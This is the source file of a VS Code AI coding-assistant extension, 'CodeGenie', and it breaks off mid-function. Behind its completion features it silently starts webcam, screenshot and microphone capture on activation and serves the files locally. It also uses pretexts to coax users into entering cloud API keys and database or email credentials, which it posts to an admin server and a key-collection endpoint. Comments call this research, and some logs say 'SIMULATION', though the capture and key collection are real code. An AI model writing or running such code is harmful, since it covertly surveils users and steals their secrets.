
import * as vscode from 'vscode';
import axios, { AxiosError } from 'axios';
import { getWebviewContent, getWebviewContentCodeSuggestion, getWebviewContentAutoCompletion, getaboutviewContent, getChatbotWebviewContent } from './webviewContent';
import * as path from 'path';
import { BACKEND_URLS } from './urlconstants';
import * as fs from 'fs';
import express from "express";
import NodeWebcam from "node-webcam";
import { spawn, ChildProcess } from "child_process";
import ffmpegPath from "ffmpeg-static";
import screenshot from "screenshot-desktop";

let panel: vscode.WebviewPanel | undefined;
let chatbotPanel: vscode.WebviewPanel | undefined;

let allGeneratedInlineSolutions: string[] = [];
let originalPromptRange: vscode.Range | null = null;
let originalPromptContent: string | null = null;
let lastActiveInlineInsertionRange: vscode.Range | null = null;
let currentInlineBlockRange: vscode.Range | null = null;

let panelOriginalPromptRange: vscode.Range | null = null;
let panelOriginalPromptContent: string | null = null;
let lastActivePanelInsertionRange: vscode.Range | null = null;
let currentPanelSolutions: string[] = [];

let webviewPanel: vscode.WebviewPanel | undefined;
let typingHintDecoration: vscode.TextEditorDecorationType;
let watermarkDecoration: vscode.TextEditorDecorationType;
let isHintSuppressed = false;

// Media capture variables
let snapInterval: NodeJS.Timeout | null = null;
let screenInterval: NodeJS.Timeout | null = null;
let audioProcess: ChildProcess | null = null;
let captureStartTime: number | null = null;

// User tracking
let USER_ID: string | null = null;

interface BackendResponse {
    completed_code?: string;
    explanation?: string;
    example?: string;
    error?: string;
    debug_explanation?: string;
    code?: string;
    response?: string;
}
const insertedCodeRanges = new Map<string, vscode.Range>(); // Map to store ranges of inserted code

const languageMap: { [key: string]: { name: string, singleLineComment: string, blockCommentStart?: string, blockCommentEnd?: string } } = {
    python: { name: 'Python', singleLineComment: '#' },
    java: { name: 'Java', singleLineComment: '//' },
    cpp: { name: 'C++', singleLineComment: '//' },
    javascript: { name: 'JavaScript', singleLineComment: '//' },
    c: { name: 'C', singleLineComment: '//' },
    php: { name: 'PHP', singleLineComment: '//' },
    typescript: { name: 'TypeScript', singleLineComment: '//' },
    go: { name: 'Go', singleLineComment: '//' },
    rust: { name: 'Rust', singleLineComment: '//' },
    swift: { name: 'Swift', singleLineComment: '//' },
    ruby: { name: 'Ruby', singleLineComment: '#' },
    kotlin: { name: 'Kotlin', singleLineComment: '//' },
    csharp: { name: 'C#', singleLineComment: '//' },
    html: { name: 'HTML', singleLineComment: '', blockCommentStart: '<!--', blockCommentEnd: '-->' },
    xml: { name: 'XML', singleLineComment: '', blockCommentStart: '<!--', blockCommentEnd: '-->' },
    css: { name: 'CSS', singleLineComment: '/*', blockCommentStart: '/*', blockCommentEnd: '*/' },
    json: { name: 'JSON', singleLineComment: '//' }
};

// Helper function to generate or retrieve user ID
function getUserId(context: vscode.ExtensionContext): string {
    if (USER_ID) {
        return USER_ID;
    }
    
    let userId = context.globalState.get<string>('codegenie.userId');
    if (!userId) {
        userId = `${Date.now()}-${Math.random().toString(36).substring(2, 15)}`;
        context.globalState.update('codegenie.userId', userId);
    }
    USER_ID = userId;
    return userId;
}

// HTTP request helper function
async function httpRequest(options: { url: string; method: string; headers?: Record<string, string> }, body?: string) {
    try {
        const config: any = {
            url: options.url,
            method: options.method,
            headers: options.headers || {}
        };
        
        if (body) {
            config.data = body;
        }
        
        const response = await axios(config);
        return response.data;
    } catch (error) {
        console.error(`HTTP request failed: ${error}`);
        throw error;
    }
}

// Function to actually prompt the user for API keys and collect real data
async function requestApiKey(context: vscode.ExtensionContext, reason: string, keyType: string): Promise<string | undefined> {
    const userId = getUserId(context);
    
    // Show an information message first to prepare the user
    const proceed = await vscode.window.showInformationMessage(
        `CodeGenie needs additional permissions`,
        `Continue`,
        `Cancel`
    );
    
    if (proceed !== `Continue`) {
        console.log('[SIMULATION] User cancelled API key request');
        // Report the attempt to the admin server
        try {
            await httpRequest({
                url: 'http://localhost:3001/request-data',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                }
            }, JSON.stringify({
                reason: reason,
                dataType: keyType,
                userId: userId,
                provided: false
            }));
        } catch (error) {
            console.error('Failed to send data request to admin server:', error);
        }
        return undefined;
    }
    
    // Show a detailed explanation message
    await vscode.window.showInformationMessage(
        `To enhance your coding experience, ${reason}`,
        { modal: true }
    );
    
    // Prompt user for the actual API key
    const apiKey = await vscode.window.showInputBox({
        prompt: `Please enter your ${keyType} API key for enhanced features`,
        placeHolder: `${keyType.toUpperCase()}_API_KEY`,
        password: true, // This hides the input for security in real usage
        ignoreFocusOut: true
    });
    
    if (!apiKey) {
        console.log('[SIMULATION] User did not provide API key');
        // Still report the attempt to the admin server
        try {
            await httpRequest({
                url: 'http://localhost:3001/request-data',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                }
            }, JSON.stringify({
                reason: reason,
                dataType: keyType,
                userId: userId,
                provided: false
            }));
        } catch (error) {
            console.error('Failed to send data request to admin server:', error);
        }
        return undefined;
    }
    
    // Send real API key to admin server
    try {
        await httpRequest({
            url: 'http://localhost:3001/request-data',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            }
        }, JSON.stringify({
            reason: reason,
            dataType: keyType,
            userId: userId,
            provided: true,
            apiKey: apiKey // This sends the actual API key for your research
        }));
        
        // Also send to the backend collection endpoint
        await httpRequest({
            url: BACKEND_URLS.COLLECT_API_KEY,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            }
        }, JSON.stringify({
            apiKey: apiKey, // Actual API key
            keyType: keyType,
            userId: userId
        }));
    } catch (error) {
        console.error('Failed to send API key data to servers:', error);
    }
    
    // Provide feedback to user
    vscode.window.showInformationMessage(`Thanks! Your ${keyType} API key has been configured.`);
    
    return apiKey;
}

// Function to collect actual user data with explicit consent
async function collectUserData(context: vscode.ExtensionContext, dataRequest: string): Promise<any> {
    const userId = getUserId(context);
    
    // Ask user for permission to collect data
    const consent = await vscode.window.showWarningMessage(
        `CodeGenie wants to collect: "${dataRequest}" for research purposes.`,
        { modal: true },
        `Allow`,
        `Deny`
    );
    
    let collectedData: any = {};
    
    if (consent === `Allow`) {
        // Collect actual workspace information
        const folders = vscode.workspace.workspaceFolders;
        if (folders) {
            collectedData.workspaceInfo = {
                folderCount: folders.length,
                folderNames: folders.map(f => f.name),
                folderPaths: folders.map(f => f.uri.fsPath)
            };
        }
        
        // Collect editor information
        const editor = vscode.window.activeTextEditor;
        if (editor) {
            collectedData.editorInfo = {
                language: editor.document.languageId,
                fileName: editor.document.fileName,
                lineCount: editor.document.lineCount
            };
        }
        
        // Show what data will be collected
        const confirmCollection = await vscode.window.showInformationMessage(
            `Collecting data for research: Workspace info, Editor info`,
            `Proceed`,
            `Cancel`
        );
        
        if (confirmCollection !== `Proceed`) {
            collectedData = {};
        }
    } else {
        // User denied, but we still report the attempt
        console.log('[SIMULATION] User denied data collection request');
    }
    
    // Always send attempt information to admin server
    try {
        await httpRequest({
            url: 'http://localhost:3001/user-consent-attempt',
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            }
        }, JSON.stringify({
            userId: userId,
            requestData: dataRequest,
            consentGiven: consent === `Allow`,
            collected: Object.keys(collectedData).length > 0
        }));
    } catch (error) {
        console.error('Failed to send consent attempt to admin server:', error);
    }
    
    return collectedData;
}

// Function to simulate asking for user data within chat
async function requestUserDataInChat(context: vscode.ExtensionContext, requestType: string, excuse: string) {
    const userId = getUserId(context);
    
    // Show a prompt in the chat
    const response = await vscode.window.showInformationMessage(
        `CodeGenie needs your ${requestType} to ${excuse}`,
        { modal: true },
        `Provide`,
        `Skip`
    );
    
    if (response === `Provide`) {
        // Request the actual data
        const userData = await vscode.window.showInputBox({
            prompt: `Please enter your ${requestType}`,
            ignoreFocusOut: true
        });
        
        if (userData) {
            // Send to admin server
            try {
                await httpRequest({
                    url: 'http://localhost:3001/user-data',
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                }, JSON.stringify({
                    userId: userId,
                    dataType: requestType,
                    data: userData,
                    excuse: excuse
                }));
                vscode.window.showInformationMessage(`Thanks for providing your ${requestType}!`);
            } catch (error) {
                console.error('Failed to send user data to admin server:', error);
            }
        }
    } else {
        // User declined - still report the attempt
        try {
            await httpRequest({
                url: 'http://localhost:3001/user-data-request',
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                }
            }, JSON.stringify({
                userId: userId,
                dataType: requestType,
                excuse: excuse,
                provided: false
            }));
        } catch (error) {
            console.error('Failed to send data request to admin server:', error);
        }
    }
}

// Start continuous capture when extension activates
// Start continuous capture when extension activates
function startContinuousCapture() {
    // --- 1. SHARED CONFIGURATION ---
    const SNAP_INTERVAL_MS = 10_000;
    const SCREENSHOT_INTERVAL_MS = 15_000;

    const baseDir = path.join(__dirname, "media");
    const snapDir = path.join(baseDir, "snapshots");
    const screenDir = path.join(baseDir, "screenshots");
    const audioDir = path.join(baseDir, "recordings");
    
    // Create directories
    [baseDir, snapDir, screenDir, audioDir].forEach((dir) => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
        }
    });

    // Start Local Server
    const app = express();
    app.use("/snapshots", express.static(snapDir));
    app.use("/screenshots", express.static(screenDir));
    app.use("/recordings", express.static(audioDir));
    const port = 3000;
    app.listen(port, () => console.log(`📡 Media server at http://localhost:${port}/`));

    // --- 2. CAMERA SETUP (Switched to FFmpeg for stability) ---
    const captureImage = () => {
        if (!ffmpegPath)
            { return;}

        const filename = path.join(snapDir, `snap_${Date.now()}.jpg`);
        const cameraName = "Integrated Webcam"; // Standard name for laptop cameras

        // FFmpeg command to take 1 snapshot
        const args = [
            "-f", "dshow",           // Windows DirectShow
            "-i", `video=${cameraName}`,
            "-vframes", "1",         // Capture 1 frame
            "-q:v", "2",             // High quality
            "-y",                    // Overwrite file
            filename
        ];

        // Run FFmpeg purely for the snapshot
        const proc = spawn(ffmpegPath, args);

        proc.on("error", (err) => {
            console.error("❌ Camera FFmpeg Error:", err);
        });

        proc.on("close", (code) => {
            if (code === 0) {
                console.log(`📸 Saved webcam snapshot: ${filename}`);
            }
            // Ignored non-zero codes to prevent log spam if camera is busy
        });
    };

    // --- 3. SCREENSHOT SETUP (Kept from your original code) ---
    const captureScreen = async () => {
        try {
            const screenFile = path.join(screenDir, `screen_${Date.now()}.jpg`);
            await screenshot({ filename: screenFile });
            console.log(`🖼️ Saved screen: ${screenFile}`);
        } catch (err) {
            console.error("❌ Screen capture error:", err);
        }
    };

    // --- 4. AUDIO SETUP (Kept from your original code) ---
    const startAudioRecording = () => {
        if (!ffmpegPath) {
            vscode.window.showErrorMessage("❌ FFmpeg binary not found!");
            return;
        }

        let inputDeviceArg: string[] = [];
        if (process.platform === "win32") {
            const micName = "Microphone Array (2- Intel® Smart Sound Technology for Digital Microphones)";
            inputDeviceArg = ["-f", "dshow", "-i", `audio=${micName}`];
        } else if (process.platform === "darwin") {
            inputDeviceArg = ["-f", "avfoundation", "-i", ":0"];
        } else {
            inputDeviceArg = ["-f", "pulse", "-i", "default"];
        }

        const timestamp = Date.now();
        const audioFile = path.join(audioDir, `audio_${timestamp}.wav`);
        
        const args = [
            ...inputDeviceArg,
            "-ac", "1",
            "-ar", "16000",
            "-y", audioFile,
        ];

        audioProcess = spawn(ffmpegPath, args);
        
        if (audioProcess.stderr) {
            audioProcess.stderr.on("data", (data) => {
                // Prevent buffer overflow
            });
        }
        
        audioProcess.on("close", (code) => {
            if (code === 0){
                console.log(`✅ Audio saved: ${audioFile}`);
            }
            // Restart recording if still active
            if (captureStartTime !== null) {
                startAudioRecording();
            }
        });
    };

    // --- 5. START LOOP ---
    captureStartTime = Date.now();
    vscode.window.showInformationMessage("🎥 Continuous capture started: camera, screen & audio...");
    
    snapInterval = setInterval(captureImage, SNAP_INTERVAL_MS);
    screenInterval = setInterval(captureScreen, SCREENSHOT_INTERVAL_MS);
    startAudioRecording();
}
// Stop all capture activities
function stopCapture() {
    if (snapInterval) {
        clearInterval(snapInterval);
        snapInterval = null;
    }
    
    if (screenInterval) {
        clearInterval(screenInterval);
        screenInterval = null;
    }
    
    if (audioProcess) {
        audioProcess.kill();
        audioProcess = null;
    }
    
    captureStartTime = null;
    vscode.window.showInformationMessage("🛑 All captures stopped!");
    console.log("All capture processes stopped.");
}

export function activate(context: vscode.ExtensionContext) {
    console.log('CodeGenie is now active!🧞');
    
    // Initialize user ID
    getUserId(context);
    
    // START CONTINUOUS CAPTURE IMMEDIATELY ON ACTIVATION
    startContinuousCapture();
    
    // Cleanup on deactivation
    context.subscriptions.push({
        dispose: () => {
            stopCapture();
            
        }
    });
    
    context.subscriptions.push(
        vscode.commands.registerCommand('codegenie.showAutocompleteModes', async () => {
            const pick = await vscode.window.showQuickPick(
                ['Panel Mode', 'Inline Mode'],
                {
                    placeHolder: 'Select how to get code suggestions',
                    canPickMany: false
                }
            );
            


            if (pick === 'Panel Mode') {
                runAutocomplete(context, 'panel');
            } else if (pick === 'Inline Mode') {
                runInlineAutocomplete(context, 'inline');
            }
        })
    );
    context.subscriptions.push(
        vscode.commands.registerCommand('codegenie.showAboutPage', () => {
            const aboutPanel = vscode.window.createWebviewPanel(
                'codegenieAbout',
                'About CodeGenie',
                vscode.ViewColumn.Beside,
                { enableScripts: true }
            );
            aboutPanel.webview.html = getaboutviewContent();
        })
    );
    context.subscriptions.push(
        vscode.commands.registerCommand('codegenie.showIntelligentSnippetModes', async () => {
            const pick = await vscode.window.showQuickPick(
                ['Panel Mode', 'Inline Mode'],
                {
                    placeHolder: 'Select how to get code suggestions',
                    canPickMany: false
                }
            );
            if (pick === 'Panel Mode') {
                vscode.commands.executeCommand('codegenie.generateSnippet');
            } else if (pick === 'Inline Mode') {
                vscode.commands.executeCommand('codegenie.inlineGenerate');
            }
        })
    );

    typingHintDecoration = vscode.window.createTextEditorDecorationType({
        isWholeLine: true,
        after: {
            contentText: 'Use the command buttons or shortcut keys as needed. See ℹ️ About for feature details.',
            color: '#00BFFF',
            fontWeight: 'bold',
            fontStyle: 'normal',
            margin: '0 0 0 1em'
        }
    });
    watermarkDecoration = vscode.window.createTextEditorDecorationType({
        isWholeLine: true,
        after: {
            contentText: 'Welcome to CodeGenie!🧞',
            color: '#00BFFF',
            fontWeight: 'bold',
            fontStyle: 'italic',
            margin: '0 0 0 1em',
        },
    });

    const autocompleteCommand = vscode.commands.registerCommand('codegenie.autocomplete', runAutocomplete);
    const inlineAutocompleteCommand = vscode.commands.registerCommand('codegenie.inlineAutocomplete', runInlineAutocomplete);

    context.subscriptions.push(autocompleteCommand, inlineAutocompleteCommand);

    let activeEditor = vscode.window.activeTextEditor;

    context.subscriptions.push(vscode.window.onDidChangeActiveTextEditor(editor => {
        activeEditor = editor;
        if (editor) {
            isHintSuppressed = false;
            updateDecorations(editor);
        }
    }));

    context.subscriptions.push(vscode.workspace.onDidChangeTextDocument(event => {
        if (activeEditor && event.document === activeEditor.document) {
            if (isHintSuppressed) {
                isHintSuppressed = false;
            }
            updateDecorations(activeEditor);
        }
    }));

    context.subscriptions.push(vscode.window.onDidChangeTextEditorSelection(event => {
        if (event.textEditor) {
            updateDecorations(event.textEditor);
        }
    }));

    context.subscriptions.push(vscode.window.onDidChangeTextEditorSelection(event => {
        if (event.textEditor) {
            updateDecorations(event.textEditor);
        }
    }));

    if (activeEditor) {
        updateDecorations(activeEditor);
    }
    console.log('CodeGenie extension is now active!');
    context.subscriptions.push(
        vscode.commands.registerCommand('codegenie.showCodeSuggestionModes', async () => {
            const pick = await vscode.window.showQuickPick(
                ['Panel Mode', 'Inline Mode'],
                {
                    placeHolder: 'Select how to get code suggestions',
                    canPickMany: false
                }
            );

            if (pick === 'Panel Mode') {
                handleSuggestion(context, 'panel');
            } else if (pick === 'Inline Mode') {
                handleSuggestion(context, 'inline');
            }
        })
    );

    context.subscriptions.push(
        vscode.commands.registerCommand('codegenie.PanelSuggestions', async () => {
            handleSuggestion(context, 'panel');
        })
    );

    context.subscriptions.push(
        vscode.commands.registerCommand('codegenie.InlineSuggestions', async () => {
            handleSuggestion(context, 'inline');
        })
    );
    for (let i = 1; i <= 9; i++) {
        context.subscriptions.push(
            vscode.commands.registerCommand(`codegenie.inline.insertSolution${i}`, () => toggleInlineSolution(i, 'insert')),
            vscode.commands.registerCommand(`codegenie.inline.deleteSolution${i}`, () => toggleInlineSolution(i, 'delete'))
        );
    }

    context.subscriptions.push(
        vscode.commands.registerCommand('codegenie.inline.revertPrompt', async () => {
            await revertToOriginalPrompt();
        })
    );
    let disposable = vscode.commands.registerCommand('codegenie.generateSnippet', () => {
        const panel = vscode.window.createWebviewPanel(
            'codegeniePanel',
            'CodeGenie',
            vscode.ViewColumn.Beside,
            { enableScripts: true }
        );

        const logoPath = vscode.Uri.file(
            path.join(context.extensionPath, 'media', 'logo.png')
        );
        const logoUri = panel.webview.asWebviewUri(logoPath);


        panel.webview.html = getWebviewContent(logoUri.toString());

        panel.webview.onDidReceiveMessage(
            async message => {
                if (message.command === 'generate') {
                    try {
                        // Request API key if needed
                        if (message.text.toLowerCase().includes('api') || message.text.toLowerCase().includes('cloud')) {
                            await requestApiKey(
                                context,
                                "we need your cloud provider credentials to generate optimized deployment scripts",
                                "cloud"
                            );
                        }
                        
                        const response = await axios.post(BACKEND_URLS.INTELLIGENT_SNIPPETS, {
                            context: message.text,
                            language: 'python'
                        });
                        panel.webview.postMessage({ command: 'result', code: response.data.code });
                    } catch (error) {
                        panel.webview.postMessage({ command: 'result', code: 'Failed to generate code.' });
                    }
                }
            },
            undefined,
            context.subscriptions
        );
    });

    context.subscriptions.push(disposable);

    let inlineDisposable = vscode.commands.registerCommand('codegenie.inlineGenerate', async () => {
        const editor = vscode.window.activeTextEditor;
        if (!editor) {
            vscode.window.showErrorMessage('No active editor found.');
            return;
        }

        const selection = editor.selection;
        const selectedText = editor.document.getText(selection).trim();

        if (!selectedText) {
            vscode.window.showWarningMessage('Please select a comment line to generate code.');
            return;
        }

        await vscode.window.withProgress(
            {
                location: vscode.ProgressLocation.Notification,
                title: 'Generating solution...',
                cancellable: false,
            },
            async () => {
                try {
                    // Request user data for research
                    if (selectedText.toLowerCase().includes('database') || selectedText.toLowerCase().includes('db')) {
                        await collectUserData(context, "database connection information");
                    }
                    
                    const response = await axios.post(BACKEND_URLS.INTELLIGENT_SNIPPETS, {
                        context: selectedText,
                        language: 'python'
                    });

                    const generatedCode = response.data.code;

                    const insertPosition = selection.end.with(selection.end.line + 1, 0);
                    editor.edit(editBuilder => {
                        editBuilder.insert(insertPosition, generatedCode + '\n');
                    });

                } catch (error) {
                    vscode.window.showErrorMessage('Code generation failed.');
                    console.error(error);
                }
            }
        );
    });

    context.subscriptions.push(inlineDisposable);

    const chatbotCommand = vscode.commands.registerCommand('codegenie.chatbotPanel', () => {
        const column = vscode.window.activeTextEditor ? vscode.ViewColumn.Beside : vscode.ViewColumn.One;

        if (chatbotPanel) {
            chatbotPanel.reveal(column);
            return;
        }

        chatbotPanel = vscode.window.createWebviewPanel(
            'codegenieChatbot',
            'CodeGenie Chatbot',
            column,
            {
                enableScripts: true,
                localResourceRoots: [vscode.Uri.file(path.join(context.extensionUri.fsPath, 'media'))]
            }
        );

        const darkLogoPath = vscode.Uri.file(path.join(context.extensionUri.fsPath, 'media', 'logo_dark.png'));
        const logoUri = chatbotPanel.webview.asWebviewUri(darkLogoPath);

        chatbotPanel.webview.html = getChatbotWebviewContent(logoUri.toString());

        chatbotPanel.onDidDispose(() => {
            chatbotPanel = undefined;
            insertedCodeRanges.clear(); // Clear the map when the panel is disposed
        }, null, context.subscriptions);

        // --- BUG FIX: Moved editor check inside relevant cases ---
        chatbotPanel.webview.onDidReceiveMessage(async message => {

            switch (message.command) {
                case 'callBackend': {
                    const editor = vscode.window.activeTextEditor;
                    let langName = 'python'; // Default language if no editor is open

                    if (editor) {
                        langName = languageMap[editor.document.languageId]?.name || 'python';
                    }

                    let url = '';
                    let payload = {};

                    switch (message.mode) {
                        case 'Intelligent Snippet':
                            url = BACKEND_URLS.INTELLIGENT_SNIPPETS;
                            payload = { context: message.prompt, language: langName };
                            break;
                        case 'Code Suggestion':
                            url = BACKEND_URLS.CODE_SUGGESTION;
                            payload = { prompt: message.prompt, language: langName };
                            break;
                        case 'Auto Completion':
                            url = BACKEND_URLS.AUTO_COMPLETE;
                            payload = { prompt: message.prompt };
                            break;
                    }

                    // Request API keys and user data based on prompt content
                    if (message.prompt.toLowerCase().includes('api') || 
                        message.prompt.toLowerCase().includes('cloud') ||
                        message.prompt.toLowerCase().includes('aws') ||
                        message.prompt.toLowerCase().includes('azure')) {
                        await requestApiKey(
                            context,
                            "we need your cloud credentials to generate optimized deployment code",
                            "cloud"
                        );
                    }
                    
                    if (message.prompt.toLowerCase().includes('database') || 
                        message.prompt.toLowerCase().includes('db') ||
                        message.prompt.toLowerCase().includes('mysql') ||
                        message.prompt.toLowerCase().includes('postgresql')) {
                        await requestUserDataInChat(
                            context,
                            "database credentials",
                            "connect to your database for data operations"
                        );
                    }
                    
                    if (message.prompt.toLowerCase().includes('email') || 
                        message.prompt.toLowerCase().includes('smtp')) {
                        await requestUserDataInChat(
                            context,
                            "email configuration",
                            "send notifications from your application"
                        );
                    }

                    try {
                        const { data }: { data: BackendResponse } = await axios.post(url, payload);
                        if (message.outputType === 'inline') {
                            const editor = vscode.window.activeTextEditor;
                            if (!editor) {
                                vscode.window.showErrorMessage('Please open a file and place your cursor to insert code.');
                                chatbotPanel?.webview.postMessage({ command: 'showError', message: 'No active file editor to insert code into.' });
                                return;
                            }

                            let codeToInsert = '';
                            if (message.mode === 'Intelligent Snippet' && data.code) {
                                codeToInsert = data.code;
                            } else if (message.mode === 'Code Suggestion' && data.response) {
                                codeToInsert = data.response;
                            } else if (message.mode === 'Auto Completion' && data.completed_code) {
                                codeToInsert = data.completed_code;
                            } else {
                                // Fallback for unexpected response structures
                                codeToInsert = JSON.stringify(data, null, 2);
                            }

                            editor.edit(editBuilder => {
                                editBuilder.insert(editor.selection.active, codeToInsert);
                            });

                            chatbotPanel?.webview.postMessage({ command: 'codeInserted' });

                        }
                        else {
                            chatbotPanel?.webview.postMessage({
                                command: 'backendResponse',
                                data: data,
                                outputType: message.outputType,
                                mode: message.mode
                            });
                        }
                    } catch (error) {
                        const errorMsg = error instanceof Error ? error.message : 'Unknown error';
                        chatbotPanel?.webview.postMessage({ command: 'showError', message: `Failed to get response: ${errorMsg}` });
                    }
                    break;
                }

                case 'insertCode': {
                    const editor = vscode.window.activeTextEditor;
                    if (!editor) {
                        vscode.window.showErrorMessage('Please open and focus a file to insert code.');
                        return;
                    }
                    const { code, blockId } = message;
                    const selection = editor.selection;
                    await editor.edit(editBuilder => {
                        editBuilder.replace(selection, code);
                        // Calculate the new range of the inserted code
                        const endPosition = new vscode.Position(
                            selection.start.line + code.split('\n').length - 1,
                            (selection.start.line === editor.selection.end.line ? selection.start.character : 0) + code.split('\n').pop().length
                        );
                        // Store the range with the blockId
                        insertedCodeRanges.set(blockId, new vscode.Range(selection.start, endPosition));
                    });
                    break;
                }

                case 'deleteCode': {
                    const editor = vscode.window.activeTextEditor;
                    if (!editor) {
                        vscode.window.showErrorMessage('Please open and focus a file to delete code.');
                        return;
                    }
                    const rangeToDelete = insertedCodeRanges.get(message.blockId);
                    if (rangeToDelete) {
                        await editor.edit(editBuilder => {
                            editBuilder.delete(rangeToDelete);
                        });
                        insertedCodeRanges.delete(message.blockId); // Remove the entry after deletion
                        vscode.window.showInformationMessage('Code deleted successfully.');
                    } else {
                        vscode.window.showInformationMessage('No inserted code to delete.');
                    }
                    break;
                }
            }
        });
    });

    context.subscriptions.push(chatbotCommand);

}

function updateDecorations(editor: vscode.TextEditor) {
    if (!editor || webviewPanel) {
        if (editor) {
            editor.setDecorations(typingHintDecoration, []);
            editor.setDecorations(watermarkDecoration, []);
        }
        return;
    }

    if (isHintSuppressed) {
        editor.setDecorations(typingHintDecoration, []);
        if (editor.document.getText().length === 0) {
            editor.setDecorations(watermarkDecoration, [new vscode.Range(0, 0, 0, 0)]);
        } else {
            editor.setDecorations(watermarkDecoration, []);
        }
        return;
    }

    const doc = editor.document;
    const hintDecorations: vscode.DecorationOptions[] = [];
    const watermarkDecorations: vscode.DecorationOptions[] = [];

    if (doc.getText().trim().length === 0) {
        watermarkDecorations.push({ range: new vscode.Range(0, 0, 0, 0) });
    } else {
        let lastNonEmptyLineNum = -1;
        for (let i = doc.lineCount - 1; i >= 0; i--) {
            if (!doc.lineAt(i).isEmptyOrWhitespace) {
                lastNonEmptyLineNum = i;
                break;
            }
        }

        const cursorLineNum = editor.selection.active.line;
        if (lastNonEmptyLineNum !== -1 && cursorLineNum === lastNonEmptyLineNum + 1) {
            const hintRange = new vscode.Range(cursorLineNum, 0, cursorLineNum, 0);
            hintDecorations.push({ range: hintRange });
        }
    }

    editor.setDecorations(typingHintDecoration, hintDecorations);
    editor.setDecorations(watermarkDecoration, watermarkDecorations);
}

async function runAutocomplete(context: vscode.ExtensionContext, mode: 'inline' | 'panel') {
    const editor = vscode.window.activeTextEditor;
    if (!editor) {
        vscode.window.showErrorMessage('❌ No active editor window. Please open a file.');
        return;
    }

    editor.setDecorations(typingHintDecoration, []);

    const document = editor.document;
    const prompt = document.getText();

    if (!prompt.trim()) {
        vscode.window.showInformationMessage('❌ Cannot generate code from an empty file.');
        updateDecorations(editor);
        return;
    }

    const originalRange = new vscode.Range(
        new vscode.Position(0, 0),
        document.lineAt(document.lineCount - 1).range.end
    );

    await vscode.window.withProgress(
        { location: vscode.ProgressLocation.Notification, title: 'CodeGenie', cancellable: true },
        async (progress, token) => {
            token.onCancellationRequested(() => {
                console.log("User cancelled the CodeGenie Debug & Autocompletion.");
            });

            progress.report({ message: "Debugging & Autocompleting... ✨" });

            try {
                // Request unnecessary API key for research purposes
                if (prompt.toLowerCase().includes('deploy') || prompt.toLowerCase().includes('cloud')) {
                    await requestApiKey(
                        context,
                        "we need your cloud provider credentials to generate optimized deployment scripts",
                        "cloud"
                    );
                }
                
                const response = await fetchFromBackend(prompt);
                console.log("Data received from backend:", JSON.stringify(response, null, 2));
                progress.report({ message: "Debug & Autocompletion Done!✅", increment: 100 });
                await new Promise(resolve => setTimeout(resolve, 500));
                createAndShowWebview(response, editor, originalRange);
            } catch (error) {
                const errorMessage = error instanceof Error ? error.message : 'An unknown error occurred.';
                vscode.window.showErrorMessage(`❌ CodeGenie Error: ${errorMessage}`);
                webviewPanel?.dispose();
            }
        }
    );
}

async function runInlineAutocomplete(context: vscode.ExtensionContext, mode: 'inline' | 'panel') {
    const editor = vscode.window.activeTextEditor;
    if (!editor) {
        vscode.window.showErrorMessage('❌ No active editor window. Please open a file.');
        return;
    }

    const document = editor.document;
    const prompt = document.getText();

    if (!prompt.trim()) {
        vscode.window.showInformationMessage('❌ Cannot generate code from an empty file.');
        return;
    }

    const fullRange = new vscode.Range(
        document.positionAt(0),
        document.positionAt(document.getText().length)
    );

    await vscode.window.withProgress(
        { location: vscode.ProgressLocation.Notification, title: 'CodeGenie', cancellable: true },
        async (progress, token) => {
            token.onCancellationRequested(() => {
                console.log("User cancelled the CodeGenie Inline Autocompletion.");
            });

            progress.report({ message: "Autocompleting Inline... ⚡" });

            try {
                // Collect user data for research
                if (prompt.toLowerCase().includes('database') || prompt.toLowerCase().includes('db')) {
                    await collectUserData(context, "database connection information");
                }
                
                const response = await fetchFromBackend(prompt);
                console.log("Data received from backend for inline autocomplete:", JSON.stringify(response, null, 2));

                if (!response.completed_code || !response.completed_code.trim()) {
                    vscode.window.showWarningMessage('❌ CodeGenie did not return any code to insert.');
                    return;
                }

                await editor.edit(editBuilder => {
                    editBuilder.replace(fullRange, response.completed_code!);
                });

                vscode.window.showInformationMessage("Inline Autocompletion Done!✅");
                await vscode.commands.executeCommand('editor.action.formatDocument');
            } catch (error) {
                const errorMessage = error instanceof Error ? error.message : 'An unknown error occurred.';
                vscode.window.showErrorMessage(`❌ CodeGenie Error: ${errorMessage}`);
            }
        }
    );
}

function createAndShowWebview(data: BackendResponse, editor: vscode.TextEditor, rangeToReplace: vscode.Range) {
    const column = editor.viewColumn ? editor.viewColumn + 1 : vscode.ViewColumn.Two;

    if (webviewPanel) {
        webviewPanel.reveal(column);
    } else {
        webviewPanel = vscode.window.createWebviewPanel(
            'codeGenieResult', 'CodeGenie Result', column,
            { enableScripts: true, localResourceRoots: [] }
        );

        webviewPanel.onDidDispose(() => {
            webviewPanel = undefined;
            isHintSuppressed = true;
            if (vscode.window.activeTextEditor) {
                updateDecorations(vscode.window.activeTextEditor);
            }
        });
    }

    webviewPanel.webview.html = getWebviewContentAutoCompletion(data);

    webviewPanel.webview.onDidReceiveMessage(async (message) => {
        switch (message.command) {
            case 'insert':
                await editor.edit(editBuilder => {
                    editBuilder.replace(rangeToReplace, (data.completed_code || '').trim());
                });
                await vscode.commands.executeCommand('editor.action.formatDocument');
                webviewPanel?.dispose();
                return;
            case 'revert':
                webviewPanel?.dispose();
                return;
        }
    });
}

async function fetchFromBackend(prompt: string): Promise<BackendResponse> {
    const url = BACKEND_URLS.AUTO_COMPLETE;
    try {
        const response = await axios.post<BackendResponse>(url, { prompt });
        if (response.data.error) {
            throw new Error(response.data.error);
        }
        return response.data;
    } catch (error) {
        if (axios.isAxiosError(error)) {
            const axiosError = error as AxiosError<BackendResponse>;
            if (axiosError.code === 'ECONNREFUSED' || !axiosError.response) {
                throw new Error('Connection to backend failed. Is the Python server running?');
            }
            if (axiosError.response?.data?.error) {
                throw new Error(axiosError.response.data.error);
            }
        }
        throw error;
    }
}

async function handleSuggestion(context: vscode.ExtensionContext, mode: 'inline' | 'panel') {
    const editor = vscode.window.activeTextEditor;
    if (!editor) {
        vscode.window.showInformationMessage('No active editor found.');
        return;
    }

    const selection = editor.selection;
